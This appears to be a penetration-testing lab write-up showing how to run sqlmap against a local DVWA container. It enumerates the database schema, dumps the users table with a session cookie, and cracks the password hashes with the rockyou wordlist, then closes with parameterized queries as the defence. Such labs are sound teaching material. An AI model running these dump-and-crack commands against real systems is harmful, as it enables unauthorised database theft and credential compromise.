# SQLMap Enumeration Lab

---
## Lab Scenario
We have been assigned to perform a penetration test on a web application. We have permission to perform the tests on the system.

## Lab Objectives
Setup and demonstrate the use of sqlmap in the enumeration of sql databases and use built-in tools to break hashes.

## Lab Environment
* Kali linux VM
* Damn Vulnerable Web Application (DVWA) running in docker on Kali

## Lab Duration
15-30 minutes

## Overview
For this lab, I'll be setting up and attacking a DVWA running with Docker on my Kali box. I'll be using sqlmap to enumerate the database and collect user login credentials stored on the database.

---

##Lab Tasks

### Setup DVWA
1. To start we're going to check that docker is installed on our kali system. Open the terminal and run  
``docker -v``

<img src="images/Screen Shot 2022-01-22 at 4.24.40 PM.png" alt="Docker version check" width="400px"/>

2. Now that we're sure docker is running let's set up DVWA. We can run  
``docker run --rm -it -p 80:80 vulnerables/web-dvwa``

<img src="images/Screen Shot 2022-01-22 at 4.33.36 PM.png" alt="Docker Pull" width="400px"/>

3. Once docker has pulled the image it should run it immediately. You can navigate to it in your browser on localhost. Login credentials are:
* Username: admin
* Password: password

<img src="images/Screen Shot 2022-01-22 at 4.38.09 PM.png" alt="DVWA login" width="400px"/>

4. Once you log in, scroll down ad click "Create / Reset Database" Now you're all set for testing.

### Enumerate the database
#### Note:
To start we need to find a point of weakness. Typically you would test various points of input of a web application for an SQLi weakness. The URL query parameter "id" in the SQL Injection section is vulnerable to this attack.  

1. sqlmap should already be installed on kali. Open a new terminal and check that sqlmap installed with:  
``sqlmap -v``

2. To start, we're currently logged into DVWA, which means we have a cookie and we need to know the values for those cookies. I have Cookie-editor on my firefox system but if you don't it's a handy plugin in firefox for reviewing your cookies.

<img src="images/Screen Shot 2022-01-22 at 4.45.45 PM.png" alt="Cookie Review" width="400px"/>

3. We're going to navigate to the SQL Injection section and in the "User ID:" enter "test" and click "Submit"

<img src="images/Screen Shot 2022-01-22 at 7.35.04 PM.png" alt="SQLi page" width="400px"/>

4. We get this URL "http://localhost/vulnerabilities/sqli/?id=test&Submit=Submit#" We can try attacking this outright but we get redirected to the login page and are asked to create a cookie.  
``sqlmap -u "http://localhost/vulnerabilities/sqli/?id=test&Submit=Submit#"``  
To stop the redirect, we can simply run add the login cookies we collected earlier.

<img src="images/Screen Shot 2022-01-22 at 7.58.31 PM.png" alt="sqlmap response" width="400px"/>

5. We use --cookie="cookiename1=cookievalue1; cookiename2=cookievalue2" to add our cookies. When we run this, we should see a successful response and we do. This will be the base of our future enumerations.  
``sqlmap -u "http://localhost/vulnerabilities/sqli/?id=test&Submit=Submit#" --cookie="PHPSESSID=2ksruslgapb4rcm2lii2l0u193; security=low"``

<img src="images/Screen Shot 2022-01-22 at 8.06.53 PM.png" alt="sqlmap response2" width="400px"/>

6. Now that we have our base attack we can tell sqlmap what we want to recall. We can use --schema to pull all the tables and their columns. One of particular interest "users" with the field "password"  
``sqlmap -u "http://localhost/vulnerabilities/sqli/?id=test&Submit=Submit#" --cookie="PHPSESSID=2ksruslgapb4rcm2lii2l0u193; security=low" --schema``



### Collect Passwords and start breaking

1. Now that we have identified a table with sensitive information we can attack that information. We can do that with --dump -T users. The -T is to identify the table we wish to dump.  
``sqlmap -u "http://localhost/vulnerabilities/sqli/?id=test&Submit=Submit#" --cookie="PHPSESSID=2ksruslgapb4rcm2lii2l0u193; security=low" --dump -T users``

2. We are prompted to know if we want to store hashes into a temporary file for further attacks with other tools. We'll say 'N' for now though. We will try to crack with a dictionary attack. I used a specific dictionary that comes with Kali. /usr/share/wordlists/rockyou.txt Once run, the hashes are quickly broken.

<img src="images/Screen Shot 2022-01-22 at 8.37.25 PM.png" alt="Broken Hashes" width="400px"/>

---

## Lab Analysis
### Summary
In this lab, we enumerated a SQL database. Once enumerated, we broke the passwords hidden there.

### Counter Measures
The main method of countering sqlmap is by preventing attacks from performing SQL injections on systems. The best way to prevent sqli attacks is by sanitizing user input before allowing to access the database. This can be done with what is called parameterized queries. Although this is beyond this lab, you can read more about it [here](https://portswigger.net/web-security/sql-injection)
